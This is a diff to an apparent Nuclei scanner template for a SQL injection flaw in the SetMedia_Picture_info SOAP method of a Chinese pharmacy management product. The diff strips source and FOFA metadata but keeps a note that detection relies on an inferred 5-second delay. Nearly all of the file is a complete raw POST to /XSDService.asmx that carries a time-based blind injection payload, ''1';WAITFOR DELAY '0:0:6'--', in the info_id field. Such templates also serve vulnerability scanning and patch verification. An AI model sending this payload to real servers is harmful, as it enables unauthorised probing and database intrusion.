@@ -3,14 +3,8 @@ info:
   name: 黄药师药业管理软件SetMedia_Picture_info存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lwmezrrf0mz0e58c
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lwmezrrf0mz0e58c
-    fofa: body="XSDService.asmx"
 http:
 - raw:
   - "POST /XSDService.asmx HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nSOAPAction: \"http://tempuri.org/SetMedia_Picture_info\"\nContent-Type: text/xml; charset=utf-8\nContent-Length: 488\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SetMedia_Picture_info xmlns=\"http://tempuri.org/\">\n      <info_id>1';WAITFOR DELAY '0:0:6'--</info_id>\n      <info_file_name>string</info_file_name>\n      <info_data>base64Binary</info_data>\n    </SetMedia_Picture_info>\n  </soap:Body>\n</soap:Envelope>"
